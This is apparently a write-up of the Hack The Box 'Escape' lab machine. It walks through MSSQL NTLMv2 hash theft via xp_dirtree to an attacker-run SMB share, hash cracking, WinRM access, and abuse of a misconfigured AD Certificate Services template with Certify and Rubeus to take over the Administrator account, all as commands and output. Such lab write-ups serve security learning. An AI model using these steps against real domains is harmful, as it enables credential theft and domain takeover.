---
layout: default
---

# Escape

# Skills

- Steal MSSQL NTMLv2
- Enumerate AD Certificate Service
- Leverage Certificate Template vulnerability

# Enumeration

The first port scan show that we are probably againts a Active directory environment.

```bash
# Nmap 7.94 scan initiated Wed Sep 27 14:03:45 2023 as: nmap -p- -n -Pn -oN 10.10.10.125_all_ports -vvv --open 10.10.11.202
Nmap scan report for 10.10.11.202
Host is up, received user-set (0.052s latency).
Scanned at 2023-09-27 14:03:45 CEST for 185s
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
1433/tcp  open  ms-sql-s         syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49667/tcp open  unknown          syn-ack
49688/tcp open  unknown          syn-ack
49689/tcp open  unknown          syn-ack
49707/tcp open  unknown          syn-ack
49711/tcp open  unknown          syn-ack
56316/tcp open  unknown          syn-ack

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Sep 27 14:06:50 2023 -- 1 IP address (1 host up) scanned in 185.51 seconds
```

Further enumeration show that there certificates envolved, reasons to think that this is a active directory machine.

```bash
# Nmap 7.94 scan initiated Wed Sep 27 12:32:52 2023 as: nmap -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49688,49689,49707,49711 -n -Pn -sCV -vvv -oN 10.10.11.202_enum 10.10.11.202
Nmap scan report for 10.10.11.202
Host is up, received user-set (0.051s latency).
Scanned at 2023-09-27 12:32:52 CEST for 98s

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-09-27 18:32:59Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f:7f54:b2ed:ff74:708d:1a6d:df34:b9bd
| SHA-1: 742a:b452:2191:3317:6739:5039:db9b:3b2e:27b6:f7fa
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITHgAAAASQUnv8kTh0LwAAAAAABDANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjIxMTE4MjEyMDM1WhcNMjMxMTE4
| MjEyMDM1WjAYMRYwFAYDVQQDEw1kYy5zZXF1ZWwuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAppJ4qi7+By/k2Yjy1J83ZJ1z/spO74W9tUZwPfgv
| mDj0KBf4FR3IN9GtLgjVX6CHwTtez8kdl2tc58HB8o9B4myaKjzhKmRX10eYaSe0
| icT5fZUoLDxCUz4ou/fbtM3AUtPEXKBokuBni+x8wM2XpUXRznXWPL3wqQFsB91p
| Mub1Zz/Kmey3EZgxT43PdPY4CZJwDvpIUeXg293HG1r/yMqX31AZ4ePLeNYDpYzo
| fKg4C5K/2maN+wTTZ1t6ARiqAWBQrxFRTH6vTOoT6NF+6HxALXFxxWw/7OrfJ4Wl
| 5Y5ui1H5vWS1ernVPE98aiJje3B5mTsPczw7oKBFEdszRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUIuJgX6Ee95CeVip7
| lbtMDt5sWIcwHwYDVR0jBBgwFoAUYp8yo6DwOCDUYMDNbcX6UTBewxUwgcQGA1Ud
<--SNIP-->
```

Now we will enumerate each service.

## SMB

SMB allowed for an anonymous login which report a share which can be accesed with a PDF from which we can extract a username and password for MSSQL service.

```bash
PublicUser:GuestUserCantWrite1
```

## MSSQL

```bash
┌──(kali㉿kali)-[~/machines/escape]
└─$ /usr/bin/impacket-mssqlclient SEQUEL.HTB/PublicUser:GuestUserCantWrite1@10.10.11.202              
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)>
```

The enumeration of this MSSQL server showed:

- There are no non default table
- We are a guest account with no admin privileges
- We can’t execute commands
- We can enumerate users

With all this we can try to steal a NTLMv2 hash from the service or user that is executing this server. Here we can see three functions to get that hash. Only the last one send a request.

 

```bash
SQL (PublicUser  guest@master)> EXEC master..xp_fileexist '\\10.10.14.17\share\effdsf'
File Exists   File is a Directory   Parent Directory Exists   
-----------   -------------------   -----------------------   
          0                     0                         0   

SQL (PublicUser  guest@master)> EXEC master..xp_subdirs '\\10.10.14.17\share\effdsf'
[-] ERROR(DC\SQLMOCK): Line 1: The EXECUTE permission was denied on the object 'xp_subdirs', database 'mssqlsystemresource', schema 'sys'.
SQL (PublicUser  guest@master)> EXEC master..xp_dirtree '\\10.10.14.17\share\effdsf'
subdirectory   depth   
------------   -----
```

In order to steal the hash we have to set a SMB server before sending the request. We also obtain a user **SQL_SVC**.

```bash
┌──(kali㉿kali)-[~/machines/escape/PE/last_try]
└─$ /usr/bin/impacket-smbserver share $(pwd) -smb2support 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.202,64814)
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:f823a38d3b125e8c6e369ad7963a3725:01010000000000000043a3f3acf2d9016c1368f0e74b732a000000000100100046006b005300790055006c0054004b000300100046006b005300790055006c0054004b000200100074006900590073006800750065004f000400100074006900590073006800750065004f00070008000043a3f3acf2d9010600040002000000080030003000000000000000000000000030000076ac7b5afd39b84278989597f31c2fc8077d777e566b516c85cf7b2c8e94a7e30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310037000000000000000000
[*] Closing down connection (10.10.11.202,64814)
```

We can crack this hash using Hascat.

```bash
SQL_SVC::sequel:aaaaaaaaaaaaaaaa:7963e271d012b4d184fb587c3f424635:
01010000000000008043164032f1d901a64f07f2408c3045000000000100100063005200450047006f0059005a0062000300100063005200450047006f0059005a0062000200100054006a006d006d004e006500410072000400100054006a006d006d004e00650041007200070008008043164032f1d9010600040002000000080030003000000000000000000000000030000055fae4efb70bb59e9414396130f066853f77c168d7cf3d0b5ee2a1a76c7ff1990a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310037000000000000000000:REGGIE1234ronnie
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SQL_SVC::sequel:aaaaaaaaaaaaaaaa:7963e271d012b4d184...000000
Time.Started.....: Fri Sep 29 10:34:23 2023 (13 secs)
Time.Estimated...: Fri Sep 29 10:34:36 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   790.5 kH/s (1.34ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10702848/14344386 (74.61%)
Rejected.........: 0/10702848 (0.00%)
Restore.Point....: 10698752/14344386 (74.58%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: REPINT1 -> RBRB1616
Hardware.Mon.#1..: Util: 36%

Started: Fri Sep 29 10:34:22 2023
Stopped: Fri Sep 29 10:34:38 2023
```

# Foothold

With this hash we can try to gain remote access to the machine or enumerate the whole domain.

```bash
┌──(kali㉿kali)-[~/machines/escape/content]
└─$ crackmapexec smb 10.10.11.202  -u 'sql_svc' -p 'REGGIE1234ronnie' 
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/machines/escape/content]
└─$ crackmapexec winrm 10.10.11.202  -u 'sql_svc' -p 'REGGIE1234ronnie' 
SMB         10.10.11.202    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.10.11.202    5985   DC               [*] http://10.10.11.202:5985/wsman
WINRM       10.10.11.202    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```

We can see a pwned in WINRM which means that we can connect remotely.

```bash
┌──(kali㉿kali)-[~/machines/escape]
└─$ evil-winrm -i 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
sequel\sql_svc
```

We can perform son basic enumeration:

- whoami /all
- cmdkey /list
- netstat -ano

But we won’t get to much. However, if we revise the root of the filesystem we will see a SQLServer folder with error logs inside.

```bash
*Evil-WinRM* PS C:\SQLServer> dir

    Directory: C:\SQLServer

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:06 AM                Logs
d-----       11/18/2022   1:37 PM                SQLEXPR_2019
-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe

*Evil-WinRM* PS C:\SQLServer> cd Logs
*Evil-WinRM* PS C:\SQLServer\Logs> dir

    Directory: C:\SQLServer\Logs

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
```

From here we can extract the password for the user Ryan.Cooper in cleartext

```bash
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

Which can be used to connect via WINRM.

```bash
┌──(kali㉿kali)-[~/machines/escape]
└─$ evil-winrm -i 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
sequel\ryan.cooper
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
```

# Privilege Escalation

Now we enumearte again all our common ways to elevate privilages. However, if we remeber we could see a certificate service from this domain, so is worth checking vulnerabilities related to AD Certificate Service. We can use Certify.exe for this. The compiled version can be obtained from https://github.com/Flangvik/SharpCollection. 

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\certify.exe find /vulnerable
```

Upon the execution of that command we can see that there is a vulnerable certificate template. This wouldn't have reported nothing if we are logged in as SQL_SVC user.

```bash
[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
```

## Certificate Template Attack

We start by requesting a certificate from a user. The vulnerability is in the fact that the template allow anyone (sequel\Domain Users S-1-5-21-4078382237-1492182817-2568127209-513) to request a certificate in behalf on any other user (ENROLLEE_SUPPLIES_SUBJECT).

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```

We obtain a certificate if everything goes well.

```bash
[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : Administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 11

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAmFymUhXWa0RRZnuaVoW5A6qagKSucz60klfAWIxFmVcW9Ik4
I7jfHbFJsrwNoXSXk0QRdskhA5WnPlEDuwYqNwvXWXOgn5gvYFs7mR8WEq6Rk/va
stkRp9qmmM3bkeklll5O1/6KT4JB0tKvad9TrcyrPKok/zbh11+/nnzn6cj+Upla
2KOCRjVb/Y5tOBSq8oV38qcMNJ3IwFnwk75+gdSE2mKwIrEetNAOO80dhNxJ83md
RcY9Q96HImQqcvbwvhTrbNTZpBo4Bm5qR+q0Z4TlSkeW4hrDEmIJZTWvqKY8Qja1
nQof5KAwRk7OM4TFNRfA5tfz0vJarEzMd8aM2QIDAQABAoIBADuxySROFAVQ7geW
E+EkYVmzZPdUDlluzvarVNwckURD3+WNQaaVTy1mAbb6gOiqMpzrRWBh6wJphu4e
dbS39KA+jnAool0FFkLNW+thR5eoN7dgLM53x7gZLb6eoRFo5GYmqwNrYitGoJ2G
GF4FttZYYxrQmtA3Y4Krq/rfe0mX8HFAyeVc4u9k+liZhPvPK7Ez2xfcuHg+1EhE
k4920ckdbjtLb61B0uzTHCCYlbdrvGXV2AuAI6u1W9LjQ2hIBtV+Jv8xf910wHv1
+ocNicMRGsAUVHyqAolMjYAfJZA/LPIY0dTW4ysOtK3TowdFmPgXd9D0UQXacIgp
s82oUFUCgYEAw759b7qTmlUkuwf7fhZ6A6kvOyrd/uJEYuKyWlyTsLLcw6LwI/6Z
Pi512QsQ8ehaMY3895nsWocGKXpM12eVOEMMjYwaXsi75yjm20juDUKLBhqtU1FP
TN57NmvrZaLkXiUNg6zkIjSCqiYr64cJoYCjqibkuL9JCPd03YLDagsCgYEAx0Nz
CO+sgIUZvnHfFtaq/9EDZ1NEhv78qVyiVZRaZfYjR8ZNFJVq2wt4vIa4I6zYMri2
0sg74RWMTy19L2BU9TZ1hgN/t1DE5d67NVXdbb21QANLiPoVRxdi8+hxw3knHwQW
s4/FZsMwcI4aM/hbRd2BcIulZ7NtHcvpaUP+VysCgYEAlyVHHHf4M4qdQyJFyrW2
X49LHifapU64OZcM2wNzM1TZbOMrBNA6Ki6b5w1Jd1HQG0WlWNdtDvYGBw8duJKO
QZRcZAwT7K6ZkUQfBqJI1spUKVF+FsDJN/TvNTWd3awrJJr91Xgx7EuZvaKd9U8f
W6rGNcO0hweFcLwLbGPlWsMCgYEAnZEBcuyLHKmjXMwQm6+uUlGF/nuCsbkKNCZT
G5cPEJdc+JGfPAqXD5T3qSRikZtI7nrP3seFSgxPAgE3f3IOXETvE8TKhjuxJxBE
Ov2l9fRQUckJPsx6bNfaYILLCsZPoCAMj3q9nu/z6t0DbVsTWaC5jTRv3BuuyiQH
czzX7zcCgYEAgIM8rXF3NUGJCKqxtZsHcoURi9MJ1avhhaHv12GY1gDQQY/f/KVC
k3mL0+lKi16TUbvrBfgWpbpiAy6ov0ZpunkwHNdNqGGb198T/mputPz1krmobyLH
4GcPn/ebIjIe26SuQJUb3m8qX/FU5yopo0TYaJ2Nu26DBbJgwoWoKsM=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAAup5tHatr/2SAAAAAAACzANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
```

We copy the private key and the certificate into a file and create the pfx format.

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

With the certificate we request a TGT as the user and also his NTLM hash.

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /outfile:ticket /getcredentials /show /nowrap
```

```bash
[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[*] Using domain controller: fe80::5c9:456f:bdd3:b5c8%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBBQQOHd72HjrVAx5980DMEMH/VfRdBryIDcBq11oG56zvFvJCSdMTkkqzO6WuG6kgChzPA57IP8GIHIWtd9971I9cOlwjrMIDNpTQAI5Gv//zhajYcPEONiTKX+Ahs5Tb8agxYY+pLt5xDX+u6G5c8xfhpfT4zitPaUGPY1y4Zf1Ih+3tTjB7zLh5PNVJXSx+4JPVZghCnvEEVoCmhRP8+fGWZ0wLlNKz0AKtMIj6oj6bHUoMHRTdvKTdwXFpmFtMHcCYREjXdBZTyM38U9hTKNtbisE1ZRXu/3ivHRfne2nOAQK7RWQvpev4bNZicoQVuC7lYB+ZZyWSXaYSyWD05Q6Mqf60QubwwftCC7p4b4BLt84m88muW7guuRQrCcK0F2a2UgTqfz2rdrIHRQx8H17VHnWJ9M4WNwAArxApnNg1IzIf5ev4OFZo8tR9vQe3g+yjopkfuBATHkVaGyHT9/SIpIgZuKsMr3d5IG4q1UMrdolpHOGnodII4f078FBGH4Y7915/2+VQsJb9L7pNVMPxZ1NAj6DWAwCI5r4tdj2hMh/uV9pJMfaPqV/8Vb9hx3HScY88y3BTzbXGD4oB2dFXPptbrxgA6pikEFnaNMGIPzitTozq3rWIW5FaG0EcUUkO2PgZyQiXrTaN7R5z9NTL0EAMA2ix9Qxth/XJuoz0FYN6vMP882PPvP9Ah2mhWwMKR0F6+C2/OmStgNEmo8Xk1WTSVRnnJli59mpNoXkWYfquRtZsjRb6W5x5vOmLgHuryijGIOjpgcxOPIaoIGJkSYJiH/k1Wt4jtpQy1um+VTHm05Ss1SJoZe+e/fLjgtQPMyFh9UrAa4ocgwRyBnGaPVV8Mik+ZwPi2qxxKDX36qrqvYsASbmfModRY+xQgTvIRLR6nCnPXNUo8lGblWfnfH+K2RZJ4kCjaICsvJZSrapj2J+B5Ibl0c+V0YDJypg7bYocyNcXPX2TnG7OY0aCHFwqB2x+y7viPiEJzYhcAV5PXGHyRtuPSipTI+i5e/3W6iyAvnVaaVmKlWlIhLBURVQjmSKBZ09OFXFcMnw+6FE1sLFCap/OXI5irTt2hwaJ0HgKoMd5m6UnDR2DSX66XLC3YSEBHR1Z75uPNyXzbclg7dQFk4I9fW3i4uBcA3nRinPRlCV57DJs57146mf8HMMcvN8/4BEs/gy/PdbYKVi9WDdaGIU+TiUQsEWPd9xixfGgID+9kuY2TzJ3lNDDy7NTklV+Cjr6bbohKy948YTs3hL21HLfSnKlPPkBZZEdv7Kj8sMZ+a7+PSqi0dVWlrf1aXfNpm1zEQ75NBCmyDOw3rfnnHJA6FNGaP50lxYEe8Ay2wR8d3utit4ZThhHkXnSYUn2gk5Cf7YNCujQzk9izHwfvrb/aVdMZdMBHrZepPSBcegxCqKApN76rdGttp+33yomVwkRE9fCOTdcm1aI0+rLIXnN68X9MQkcMl0JfBYvBcGDhqU4LtSBR0EOMqpFb6wXaU7D6HNO70DImzt7pEoMoKX85lzFAZcGA2Ed3VLXL7lNiCaL6OwnadSZwRO9Y0kCcfnugd1sjk9VOALlVvidbrGDP+Ocu4W3cWnGy6TgZnzW6p75/8zLSKTBVDJ/tU629en1WN+oZ91ETkVbETbAeOuad/DHAyQcWHGeADoWR4nZQjQYS0xgjh96VnnJKiJM/LgsvIUOdu7N1XGBKOB1TCB0qADAgEAooHKBIHHfYHEMIHBoIG+MIG7MIG4oBswGaADAgEXoRIEEOY6CL4VUlmnlwvyI+JaXM6hDBsKU0VRVUVMLkhUQqIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAADhAAClERgPMjAyMzA5MjkxNTUyNThaphEYDzIwMjMwOTMwMDE1MjU4WqcRGA8yMDIzMTAwNjE1NTI1OFqoDBsKU0VRVUVMLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg==

Exception: C:\Users\Ryan.Cooper\Documents\ticket already exists! Data not written to file.

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  SEQUEL.HTB
  StartTime                :  9/29/2023 8:52:58 AM
  EndTime                  :  9/29/2023 6:52:58 PM
  RenewTill                :  10/6/2023 8:52:58 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  5joIvhVSWaeXC/Ij4lpczg==
  ASREP (key)              :  E16724EA2217AC9F480A5339D2F8070A

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A
```

Finally, we can log to the machine with the NTLM hash. 

```bash
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.11.202 -u Administrator  -H 'A52F78E4C751E5F5E17E1E9F3E58F4EE'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
```